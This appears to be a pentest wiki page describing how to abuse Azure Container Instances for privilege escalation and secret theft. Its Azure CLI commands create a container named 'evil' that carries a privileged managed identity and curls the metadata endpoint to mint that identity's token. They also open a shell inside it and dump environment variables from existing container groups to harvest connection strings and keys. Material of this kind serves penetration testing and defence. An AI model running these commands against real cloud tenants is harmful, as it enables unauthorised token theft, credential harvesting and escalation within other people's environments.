---
title: "Container Instances: running a container as an attached identity"
description: "Abusing Azure Container Instances to run a container as an attached managed identity or read its environment."
keywords:
  - ACI
  - Container Instances
  - managed identity
  - container
  - environment
---

# Container Instances

Azure Container Instances (ACI) run a single container without a cluster. Creating a container group with an **assigned managed identity** gives you code execution that holds that identity's token, and reading an existing group's definition exposes its environment variables, a common home for secrets.

## Run a container as a chosen identity

```bash
az container create -g <rg> -n evil --image <registry>.azurecr.io/x \
  --assign-identity <userAssignedIdentityId> --command-line "/bin/sh -c 'curl -s -H Metadata:true http://169.254.169.254/...'"
az container exec -g <rg> -n evil --exec-command "/bin/sh"
```

## Read an existing group

```bash
az container show -g <rg> -n <group> --query "containers[].environmentVariables"
```

## Exploitation notes

- The `--assign-identity` path mirrors the VM managed-identity escalation: attach a privileged user-assigned identity, then mint its token from inside the container.
- Environment variables and mounted Azure File shares on existing groups frequently carry connection strings and keys.

## Tools

- **Azure CLI** (`az container create`, `az container exec`, `az container show`).

## References

- [Microsoft: ACI managed identity](https://learn.microsoft.com/azure/container-instances/container-instances-managed-identity)
- [HackTricks Cloud: Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
